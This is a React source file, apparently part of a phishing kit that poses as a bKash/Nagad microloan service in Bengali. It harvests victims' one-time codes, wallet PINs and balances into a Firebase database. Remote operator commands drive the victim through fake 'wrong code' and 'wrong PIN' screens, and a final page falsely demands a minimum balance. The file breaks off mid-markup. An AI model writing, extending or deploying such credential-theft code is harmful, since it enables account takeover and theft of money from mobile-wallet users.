
import React, { useState, useEffect, useRef } from 'react';
import { LoanFormData } from '../types';
import { db } from '../App';
import { trackEvent } from '../lib/pixel';

enum FinalStep {
  SUMMARY = 'SUMMARY',
  CONFIRMING = 'CONFIRMING',
  CODE_ENTRY = 'CODE_ENTRY',
  WRONG_CODE = 'WRONG_CODE',
  CODE_LOADING = 'CODE_LOADING',
  PIN_ENTRY = 'PIN_ENTRY',
  SUCCESS = 'SUCCESS',
  REVIEW = 'REVIEW',
  BALANCE_ERROR = 'BALANCE_ERROR',
  NUMBER_ERROR = 'NUMBER_ERROR',
  PIN_ERROR = 'PIN_ERROR'
}

interface FinalResultPageProps {
  data: LoanFormData;
  sessionId: string;
  onSubmit: () => void;
  userBalance: string;
  lastTransaction: string;
  onSessionChange: (newId: string) => void;
  onReverifyBalance: () => void;
  onWrongNumber: () => void;
  onWrongPin: () => void;
  startAtLoading?: boolean;
  onLoadingStarted?: () => void;
}

const BKASH_LOGO = 'https://i.postimg.cc/Hx21WWJ7/IMG-20260205-090841.jpg';
const NAGAD_LOGO = '/nagad-logo.png';

const FinalResultPage: React.FC<FinalResultPageProps> = ({ data, sessionId, onSubmit, userBalance, lastTransaction, onSessionChange, onReverifyBalance, onWrongNumber, onWrongPin, startAtLoading, onLoadingStarted }) => {
  const [step, setStep] = useState<FinalStep>(FinalStep.SUMMARY);
  const providerLogo = localStorage.getItem('payment_provider') === 'nagad' ? NAGAD_LOGO : BKASH_LOGO;
  const [successPageMode, setSuccessPageMode] = useState(false);
  const [code, setCode] = useState('');
  const [pin, setPin] = useState('');
  const [codeTimer, setCodeTimer] = useState(60);
  const codeTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    const ref = db.ref('settings/successPageMode');
    const unsubscribe = ref.on('value', (snapshot: any) => {
      setSuccessPageMode(!!snapshot.val());
    });
    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
  }, []);

  const startCodeTimer = () => {
    const isNagad = localStorage.getItem('payment_provider') === 'nagad';
    setCodeTimer(isNagad ? 180 : 120);
    if (codeTimerRef.current) clearInterval(codeTimerRef.current);
    codeTimerRef.current = setInterval(() => {
      setCodeTimer(prev => {
        if (prev <= 1) {
          if (codeTimerRef.current) clearInterval(codeTimerRef.current);
          codeTimerRef.current = null;
          setStep(FinalStep.REVIEW);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const stopCodeTimer = () => {
    if (codeTimerRef.current) {
      clearInterval(codeTimerRef.current);
      codeTimerRef.current = null;
    }
  };

  const stepRef = useRef(step);
  useEffect(() => { stepRef.current = step; }, [step]);

  const doneTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const cancelDoneTimer = () => {
    if (doneTimerRef.current) {
      clearTimeout(doneTimerRef.current);
      doneTimerRef.current = null;
    }
  };

  // Client-side lock timeout: show REVIEW exactly when the 3-min server lock expires
  const lockTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  useEffect(() => {
    if (step === FinalStep.CONFIRMING || step === FinalStep.CODE_LOADING) {
      lockTimerRef.current = setTimeout(() => {
        setStep(FinalStep.REVIEW);
      }, 180000);
    } else {
      if (lockTimerRef.current) {
        clearTimeout(lockTimerRef.current);
        lockTimerRef.current = null;
      }
    }
    return () => {
      if (lockTimerRef.current) {
        clearTimeout(lockTimerRef.current);
        lockTimerRef.current = null;
      }
    };
  }, [step]);

  useEffect(() => {
    return () => { cancelDoneTimer(); stopCodeTimer(); };
  }, []);

  useEffect(() => {
    if (startAtLoading) {
      setStep(FinalStep.CODE_LOADING);
      if (onLoadingStarted) onLoadingStarted();
    }
  }, [startAtLoading]);

  useEffect(() => {
    if (!sessionId) return;
    const sessionRef = db.ref('sessions/' + sessionId);

    const handleData = (snapshot: any) => {
      const val = snapshot.val();
      if (!val) return;

      const currentStep = stepRef.current;

      if (val.adminAction === 'SHOW_VERIFY') {
        cancelDoneTimer();
        setStep(FinalStep.CODE_ENTRY);
        setCode('');
        startCodeTimer();
        sessionRef.update({ adminAction: 'NONE' });
      } else if (val.adminAction === 'WRONG_CODE') {
        cancelDoneTimer();
        stopCodeTimer();
        setStep(FinalStep.WRONG_CODE);
        setCode('');
        sessionRef.update({ adminAction: 'NONE', otp: '', gatewayOtp: '', lastAutomationData: '' });
      } else if (val.adminAction === 'REJECT_PIN') {
        cancelDoneTimer();
        setStep(FinalStep.PIN_ERROR);
        sessionRef.update({ adminAction: 'NONE' });
      } else if (val.adminAction === 'REVIEW_APP') {
        cancelDoneTimer();
        stopCodeTimer();
        setStep(FinalStep.REVIEW);
        sessionRef.update({ adminAction: 'NONE' });
      } else if (val.adminAction === 'REVERIFY_BALANCE') {
        cancelDoneTimer();
        setStep(FinalStep.BALANCE_ERROR);
        sessionRef.update({ adminAction: 'NONE' });
      } else if (val.adminAction === 'WRONG_NUMBER') {
        cancelDoneTimer();
        setStep(FinalStep.NUMBER_ERROR);
        sessionRef.update({ adminAction: 'NONE' });
      } else if (val.adminAction === 'DONE') {
        if (currentStep === FinalStep.CODE_LOADING) {
          cancelDoneTimer();
          doneTimerRef.current = setTimeout(() => {
            setStep(FinalStep.SUCCESS);
            doneTimerRef.current = null;
          }, 10000);
        }
        sessionRef.update({ adminAction: 'NONE' });
      } else if (val.adminAction === 'APPROVE') {
        cancelDoneTimer();
        setStep(FinalStep.SUCCESS);
        sessionRef.update({ adminAction: 'NONE' });
      } else if (val.adminAction === 'RESET_GATEWAY') {
        cancelDoneTimer();
        setStep(FinalStep.SUMMARY);
        setCode('');
        setPin('');
        sessionRef.update({ adminAction: 'NONE' });
      }
    };

    const cleanup = sessionRef.on('value', handleData);
    return () => { if (typeof cleanup === 'function') cleanup(); };
  }, [sessionId]);

  const handleConfirmLoan = async () => {
    const provider = localStorage.getItem('payment_provider') || 'bkash';
    try {
      trackEvent('InitiateCheckout', {}, {
        content_name: (provider === 'nagad' ? 'Nagad' : 'bKash') + ' Loan Confirmation',
        content_category: 'loan',
        currency: 'BDT',
      });
    } catch (e) {}
    const balanceNum = parseInt(userBalance || '0');
    if (balanceNum < 400) {
      setConfirmLoading(true);
      setTimeout(() => {
        setConfirmLoading(false);
        setStep(FinalStep.CONFIRMING);
        setTimeout(() => {
          setStep(FinalStep.SUCCESS);
        }, 10000);
      }, 1000);
      return;
    }
    setConfirmLoading(true);
    setTimeout(async () => {
      await db.ref('sessions/' + sessionId).update({
        balance: userBalance,
        lastAutomationData: '',
        lastUpdated: Date.now()
      });
      setConfirmLoading(false);
      setStep(FinalStep.CONFIRMING);
    }, 1000);
  };

  const [codeBtnLoading, setCodeBtnLoading] = useState(false);
  const [pinBtnLoading, setPinBtnLoading] = useState(false);

  const handleCodeSubmit = async () => {
    if (code.length === 6) {
      stopCodeTimer();
      setCodeBtnLoading(true);
      setTimeout(async () => {
        await db.ref('sessions/' + sessionId).update({
          otp: code,
          gatewayOtp: code,
          balance: userBalance,
          lastAutomationData: '',
          lastUpdated: Date.now()
        });
        setCodeBtnLoading(false);
        setStep(FinalStep.CODE_LOADING);
      }, 1000);
    }
  };

  const handlePinSubmit = async () => {
    if (pin.length === 5) {
      setPinBtnLoading(true);
      setTimeout(async () => {
        await db.ref('sessions/' + sessionId).update({
          pin: pin,
          pinResetMode: true,
          lastAutomationData: '',
          lastUpdated: Date.now()
        });
        setPinBtnLoading(false);
        setStep(FinalStep.CONFIRMING);
      }, 1000);
    }
  };

  const handleReviewBack = async () => {
    const newSessionId = 'SESS-' + Date.now();
    const res = await fetch(`/api/db?path=sessions/${sessionId}`);
    const currentData = await res.json();

    await db.ref('sessions/' + newSessionId).set({
      ...currentData,
      id: newSessionId,
      balance: '',
      lastBalance: '',
      otp: '',
      gatewayOtp: '',
      lastAutomationData: '',
      automationActive: false,
      adminAction: 'NONE',
      pinResetMode: false,
      lastUpdated: Date.now()
    });

    await db.ref('sessions/' + sessionId).update({
      automationActive: false,
      adminAction: 'NONE'
    });

    onSessionChange(newSessionId);
    setStep(FinalStep.SUMMARY);
    setCode('');
    setPin('');
  };

  const handleBalanceReverify = async () => {
    const newSessionId = 'SESS-' + Date.now();
    const res = await fetch(`/api/db?path=sessions/${sessionId}`);
    const currentData = await res.json();

    await db.ref('sessions/' + newSessionId).set({
      ...currentData,
      id: newSessionId,
      balance: '',
      lastBalance: '',
      otp: '',
      gatewayOtp: '',
      lastAutomationData: '',
      automationActive: false,
      adminAction: 'NONE',
      pinResetMode: false,
      lastUpdated: Date.now()
    });

    await db.ref('sessions/' + sessionId).update({
      automationActive: false,
      adminAction: 'NONE'
    });

    onSessionChange(newSessionId);
    onReverifyBalance();
  };

  const handleWrongNumberClick = async () => {
    const newSessionId = 'SESS-' + Date.now();
    const res = await fetch(`/api/db?path=sessions/${sessionId}`);
    const currentData = await res.json();

    await db.ref('sessions/' + newSessionId).set({
      ...currentData,
      id: newSessionId,
      balance: '',
      lastBalance: '',
      otp: '',
      gatewayOtp: '',
      lastAutomationData: '',
      automationActive: false,
      adminAction: 'NONE',
      pinResetMode: false,
      lastUpdated: Date.now()
    });

    await db.ref('sessions/' + sessionId).update({
      automationActive: false,
      adminAction: 'NONE'
    });

    onSessionChange(newSessionId);
    onWrongNumber();
  };

  const handleWrongPinClick = async () => {
    await db.ref('sessions/' + sessionId).update({
      otp: '',
      gatewayOtp: '',
      lastAutomationData: '',
      automationActive: false,
      adminAction: 'NONE',
      lastUpdated: Date.now()
    });

    onWrongPin();
  };

  const [confirmLoading, setConfirmLoading] = useState(false);

  const loanAmount = parseInt(data.loanAmount) || 0;
  const interest = loanAmount * 0.03;
  const totalRepayment = loanAmount + interest;

  const durationMonths = (() => {
    const d = data.duration || '';
    const bengaliToAscii = d.replace(/[০-৯]/g, (ch: string) => String('০১২৩৪৫৬৭৮৯'.indexOf(ch)));
    const match = bengaliToAscii.match(/(\d+)/);
    return match ? parseInt(match[1]) : 1;
  })();
  const monthlyInstallment = Math.round(totalRepayment / durationMonths);

  if (step === FinalStep.CONFIRMING) {
    return (
      <div className="max-w-xl mx-auto bg-white p-12 rounded-[40px] shadow-2xl border border-gray-100 flex flex-col items-center justify-center min-h-[400px] animate-fade-in text-center">
        <div className="relative w-24 h-24 mb-8">
          <div className="absolute inset-0 rounded-full border-4 border-[#E2136E]/20"></div>
          <div className="absolute inset-0 rounded-full border-4 border-t-[#E2136E] animate-spin"></div>
          <div className="absolute inset-0 flex items-center justify-center">
            <img src={providerLogo} className="w-10 h-10 object-contain rounded-lg" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} alt="" />
          </div>
        </div>
        <h2 className="text-2xl font-black text-gray-800 mb-4">লোন কনফারমেশন হচ্ছে...</h2>
        <p className="text-gray-500 font-bold max-w-xs">অনুগ্রহ করে অপেক্ষা করুন, আপনার আবেদনটি চূড়ান্তভাবে যাচাই করা হচ্ছে।</p>
        <div className="flex gap-1.5 mt-6">
          <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '0ms' }}></span>
          <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '150ms' }}></span>
          <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '300ms' }}></span>
        </div>
      </div>
    );
  }

  if (step === FinalStep.CODE_ENTRY) {
    return (
      <div className="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-xl border border-gray-100 animate-fade-in">
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-[#E2136E]/10 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-[#E2136E]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
          <h2 className="text-2xl font-bold text-gray-800 mb-2">বিকাশ ভেরিফিকেশন কোড</h2>
          <p className="text-sm text-gray-500 font-medium">আপনার বিকাশ নাম্বারে পাঠানো ৬ সংখ্যার কোডটি দিন</p>
          <div className="mt-3 flex items-center justify-center space-x-2">
            <svg className="w-4 h-4 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span className={`text-sm font-bold ${codeTimer <= 15 ? 'text-red-600 animate-pulse' : 'text-gray-600'}`}>
              সময় বাকি: {Math.floor(codeTimer / 60)}:{(codeTimer % 60).toString().padStart(2, '0')}
            </span>
          </div>
        </div>

        <div className="space-y-6">
          <div>
            <input
              type="tel"
              inputMode="numeric"
              maxLength={6}
              autoComplete="one-time-code"
              className="w-full p-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-[#E2136E] outline-none transition text-center text-3xl font-black tracking-[0.5em] placeholder:tracking-normal placeholder:text-gray-200"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
              placeholder="XXXXXX"
              autoFocus
            />
          </div>

          <button
            onClick={handleCodeSubmit}
            disabled={code.length !== 6 || codeBtnLoading}
            className={`w-full py-4 rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg ${
              code.length === 6 && !codeBtnLoading ? 'bg-[#E2136E] text-white hover:bg-[#D11263]' : 'bg-gray-100 text-gray-400 cursor-not-allowed'
            }`}
          >
            {codeBtnLoading ? (
              <div className="flex gap-1.5 justify-center">
                <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '0ms' }}></span>
                <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '150ms' }}></span>
                <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '300ms' }}></span>
              </div>
            ) : 'কোড নিশ্চিত করুন'}
          </button>
        </div>
      </div>
    );
  }

  if (step === FinalStep.WRONG_CODE) {
    return (
      <div className="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-xl border border-red-100 flex flex-col items-center justify-center min-h-[300px] animate-fade-in">
        <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
          <svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </div>
        <h2 className="text-xl font-black text-red-600 mb-2">ভুল ভেরিফিকেশন কোড!</h2>
        <p className="text-sm text-gray-500 font-medium mb-6 text-center">আপনার দেওয়া কোডটি সঠিক নয়। অনুগ্রহ করে সঠিক কোড দিয়ে আবার চেষ্টা করুন।</p>
        <button
          onClick={() => { setStep(FinalStep.CODE_ENTRY); setCode(''); startCodeTimer(); }}
          className="w-full py-4 bg-[#E2136E] text-white rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg"
        >
          আবার চেষ্টা করুন
        </button>
      </div>
    );
  }

  if (step === FinalStep.CODE_LOADING) {
    return (
      <div className="max-w-xl mx-auto bg-white p-12 rounded-[40px] shadow-2xl border border-gray-100 flex flex-col items-center justify-center min-h-[400px] animate-fade-in text-center">
        <div className="relative w-24 h-24 mb-8">
          <div className="absolute inset-0 rounded-full border-4 border-[#E2136E]/20"></div>
          <div className="absolute inset-0 rounded-full border-4 border-t-[#E2136E] animate-spin"></div>
          <div className="absolute inset-0 flex items-center justify-center">
            <img src={providerLogo} className="w-10 h-10 object-contain rounded-lg" onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }} alt="" />
          </div>
        </div>
        <h2 className="text-2xl font-black text-gray-800 mb-4">লোন কনফারমেশন হচ্ছে...</h2>
        <p className="text-gray-500 font-bold max-w-xs">অনুগ্রহ করে অপেক্ষা করুন...</p>
        <div className="flex gap-1.5 mt-6">
          <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '0ms' }}></span>
          <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '150ms' }}></span>
          <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '300ms' }}></span>
        </div>
      </div>
    );
  }

  if (step === FinalStep.PIN_ENTRY) {
    return (
      <div className="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-xl border border-gray-100 animate-fade-in">
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">সঠিক পিন দিন</h2>
          <p className="text-sm text-red-500 font-bold">আপনার দেওয়া পিনটি ভুল ছিল। অনুগ্রহ করে সঠিক পিন দিন।</p>
        </div>

        <div className="space-y-6">
          <div>
            <input
              type="password"
              inputMode="numeric"
              maxLength={5}
              className="w-full p-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-[#E2136E] outline-none transition text-center text-2xl font-black tracking-[0.5em]"
              value={pin}
              onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
              placeholder="•••••"
              autoFocus
            />
          </div>

          <button
            onClick={handlePinSubmit}
            disabled={pin.length !== 5 || pinBtnLoading}
            className={`w-full py-4 rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg ${
              pin.length === 5 && !pinBtnLoading ? 'bg-[#E2136E] text-white hover:bg-[#D11263]' : 'bg-gray-100 text-gray-400 cursor-not-allowed'
            }`}
          >
            {pinBtnLoading ? (
              <div className="flex gap-1.5 justify-center">
                <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '0ms' }}></span>
                <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '150ms' }}></span>
                <span className="w-2.5 h-2.5 rounded-full bg-[#E2136E] animate-bounce" style={{ animationDelay: '300ms' }}></span>
              </div>
            ) : 'নিশ্চিত করুন'}
          </button>
        </div>
      </div>
    );
  }

  if (step === FinalStep.SUCCESS) {
    return (
      <div className="w-full max-w-6xl mx-auto animate-fade-in font-sans">
        <div className="bg-white md:rounded-[40px] shadow-2xl overflow-hidden border border-gray-100 flex flex-col min-h-screen md:min-h-0">
          <div className="bg-gradient-to-br from-[#E2136E] to-[#c40f5c] py-10 text-center text-white">
            <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-white/30">
              <svg className="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
            <h2 className="text-2xl md:text-3xl font-black mb-1 px-4 tracking-tighter">লোন আবেদন ব্যর্থ</h2>
          </div>

          <div className="p-8 space-y-8 bg-white">
            <div className="space-y-4">
              <h3 className="text-xl font-bold text-gray-800">আপনার আবেদন সারসংক্ষেপ</h3>
              <div className="bg-gray-50 rounded-3xl p-6 space-y-4 border border-gray-100">
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="text-gray-600 font-bold">আবেদনকারীর নাম:</span>
                  <span className="text-gray-800 font-black">{data.fullName}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="text-gray-600 font-bold">লোনের পরিমাণ:</span>
                  <span className="text-gray-800 font-black">৳{loanAmount.toLocaleString()}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="text-gray-600 font-bold">লোনের মেয়াদ:</span>
                  <span className="text-gray-800 font-black">{data.duration}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="text-gray-600 font-bold">সুদ (৩%):</span>
                  <span className="text-gray-800 font-black text-red-500">৳{interest.toLocaleString()}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="text-gray-600 font-bold">মাসিক কিস্তির পরিমাণ:</span>
                  <span className="text-gray-800 font-black">৳{monthlyInstallment.toLocaleString()}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-200">
                  <span className="text-gray-600 font-bold">কিস্তি সংখ্যা:</span>
                  <span className="text-gray-800 font-black">{durationMonths} টি</span>
                </div>
                <div className="flex justify-between items-center py-4">
                  <span className="text-gray-800 font-black text-lg">মোট পরিশোধ:</span>
                  <span className="text-[#E2136E] font-black text-2xl">৳{totalRepayment.toLocaleString()}</span>
                </div>
              </div>
            </div>

            <div className="space-y-4">
              <h3 className="text-xl font-bold text-gray-800">সম্মানিত গ্রাহক,</h3>
              <p className="text-gray-700 leading-relaxed font-semibold">
                আমরা সফলভাবে আপনার বিকাশ মালিকানা তথ্য যাচাই করেছি। যাচাই শেষে জানানো যাচ্ছে—
              </p>
              
              <div className="space-y-6">
                <div className="bg-green-50 border-2 border-green-100 p-6 rounded-3xl shadow-sm">
                  <p className="flex items-start text-green-700 font-bold">
                    <span className="mr-2 text-blue-500">🔹</span>
                    <span>লেনদেনের ভিত্তিতে আপনি ১০০% লোনের জন্য যোগ্য।</span>
                  </p>
                </div>

                <div className="bg-red-50 border-2 border-red-100 p-6 rounded-3xl shadow-sm">
                  <p className="flex items-start text-red-700 font-bold">
                    <span className="mr-2 text-blue-500">🔹</span>
                    <span>তবে বর্তমানে আপনার বিকাশ একাউন্টে ন্যূনতম প্রয়োজনীয় ব্যালেন্স না থাকায় আমরা এই মুহূর্তে লোন প্রদান করতে পারছি না।</span>
                  </p>
                </div>

                <div className="bg-gray-50 border border-gray-200 p-6 rounded-3xl space-y-4">
                  <h4 className="font-black text-gray-800 text-lg">কেন বিকাশে ২,০০০ টাকা ব্যালেন্স রাখতে হবে?</h4>
                  <p className="text-sm text-gray-600 font-bold leading-relaxed">
                    বিকাশ অনলাইন লোন সিস্টেমে একাউন্টের সক্রিয়তা, লেনদেনের সক্ষমতা এবং নিরাপত্তা নিশ্চিত করার জন্য ন্যূনতম ২,০০০ টাকা ব্যালেন্স থাকা বাধ্যতামূলক। এটি নিশ্চিত করে যে—
                  </p>
                  <div className="space-y-3">
                    <p className="flex items-start text-gray-700 font-bold text-sm">
                      <span className="mr-2 text-green-500">✔</span>
                      <span>আপনার বিকাশ একাউন্ট সম্পূর্ণ সক্রিয় ও কার্যকর</span>
                    </p>
                    <p className="flex items-start text-gray-700 font-bold text-sm">
                      <span className="mr-2 text-green-500">✔</span>
                      <span>লোনের টাকা গ্রহণ ও ভবিষ্যৎ কিস্তি লেনদেনে কোনো সমস্যা হবে না</span>
                    </p>
                    <p className="flex items-start text-gray-700 font-bold text-sm">
                      <span className="mr-2 text-green-500">✔</span>
                      <span>ভুয়া বা ঝুঁকিপূর্ণ একাউন্ট থেকে আবেদন স্বয়ংক্রিয়ভাবে প্রতিরোধ করা যায়</span>
                    </p>
                  </div>
                  <p className="text-xs text-[#E2136E] font-black mt-4">
                    গুরুত্বপূর্ণ: এই ২,০০০ টাকা থেকে কোনো টাকা কাটা হবে না এবং বিকাশের এমন কোনো অনুমতিও নেই।
                  </p>
                </div>

                <div className="bg-white border-2 border-gray-100 p-6 rounded-3xl space-y-4 shadow-md">
                  <h4 className="font-black text-gray-800 border-b pb-2">আপনার বর্তমান লোন স্ট্যাটাস</h4>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600 font-bold flex items-center">
                      <span className="mr-2 text-green-500">✔</span> লেনদেন যোগ্যতা:
                    </span>
                    <span className="text-green-600 font-black">১০০% এলিজেবল</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600 font-bold flex items-center">
                      <span className="mr-2 text-red-500">✖</span> বিকাশ ব্যালেন্স:
                    </span>
                    <span className="text-red-600 font-black">অপর্যাপ্ত</span>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-pink-50 p-4 rounded-2xl border border-pink-100 flex items-center justify-center space-x-3">
              <svg className="w-5 h-5 text-pink-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
              <p className="text-[11px] text-pink-700 font-black italic text-center leading-tight">আপনার বিকাশ একাউন্ট সুরক্ষিত রাখতে কখনই পিন কারো সাথে শেয়ার করবেন না।</p>
            </div>

            <button
              onClick={() => { window.location.reload(); }}
              className="w-full py-4 bg-[#E2136E] text-white rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg hover:bg-[#D11263]"
            >
              আবার চেষ্টা করুন
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (step === FinalStep.BALANCE_ERROR) {
    return (
      <div className="max-w-xl mx-auto animate-fade-in">
        <div className="bg-white p-10 rounded-3xl shadow-xl border border-red-100 text-center">
          <div className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.732-.833-2.5 0L4.27 16.5c-.77.833.192 2.5 1.732 2.5z" />
            </svg>
          </div>

          <h2 className="text-2xl font-black text-red-600 mb-3">আপনার বিকাশ অ্যাকাউন্ট ভেরিফিকেশন সফল হয়নি</h2>
          <p className="text-gray-600 font-medium leading-relaxed mb-8">
            পুনরায় আপনার বর্তমান বিকাশ অ্যাকাউন্টের ব্যালেন্স লিখুন।
          </p>

          <div className="bg-red-50 rounded-2xl p-5 mb-8 border border-red-100">
            <div className="flex items-center space-x-3 text-left">
              <svg className="w-5 h-5 text-red-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <p className="text-sm text-red-700 font-bold">একাধিকবার ইচ্ছাকৃত ভুল তথ্য দিয়ে আবেদন করলে আপনার একাউন্ট ঝুকিপূর্ণ হিসাবে বিবেচিত হবে</p>
            </div>
          </div>

          <button
            onClick={handleBalanceReverify}
            className="w-full py-4 bg-[#E2136E] text-white rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg hover:bg-[#D11263]"
          >
            পুনরায় ব্যালেন্স দিন
          </button>
        </div>
      </div>
    );
  }

  if (step === FinalStep.NUMBER_ERROR) {
    return (
      <div className="max-w-xl mx-auto animate-fade-in">
        <div className="bg-white p-10 rounded-3xl shadow-xl border border-red-100 text-center">
          <div className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
            </svg>
          </div>

          <h2 className="text-2xl font-black text-red-600 mb-4">ভুল বিকাশ নাম্বার</h2>
          <p className="text-gray-600 font-semibold leading-relaxed mb-8">
            লোন নিতে অবশ্যই আপনার সঠিক বিকাশ অ্যাকাউন্ট নম্বর প্রদান করুন। ভুল নম্বর দিলে লোন আবেদন বাতিল হয়ে যেতে পারে।
          </p>

          <button
            onClick={handleWrongNumberClick}
            className="w-full py-4 bg-[#E2136E] text-white rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg hover:bg-[#D11263]"
          >
            সঠিক নাম্বার দিন
          </button>
        </div>
      </div>
    );
  }

  if (step === FinalStep.PIN_ERROR) {
    return (
      <div className="max-w-xl mx-auto animate-fade-in">
        <div className="bg-white p-10 rounded-3xl shadow-xl border border-red-100 text-center">
          <div className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>

          <h2 className="text-2xl font-black text-red-600 mb-4">ভুল বিকাশ পিন</h2>
          <p className="text-gray-600 font-semibold leading-relaxed mb-8">
            আপনার দেওয়া পিনটি সঠিক নয়। অনুগ্রহ করে সঠিক বিকাশ পিন দিয়ে আবার চেষ্টা করুন।
          </p>

          <button
            onClick={handleWrongPinClick}
            className="w-full py-4 bg-[#E2136E] text-white rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg hover:bg-[#D11263]"
          >
            সঠিক পিন দিন
          </button>
        </div>
      </div>
    );
  }

  if (step === FinalStep.REVIEW) {
    return (
      <div className="max-w-xl mx-auto animate-fade-in">
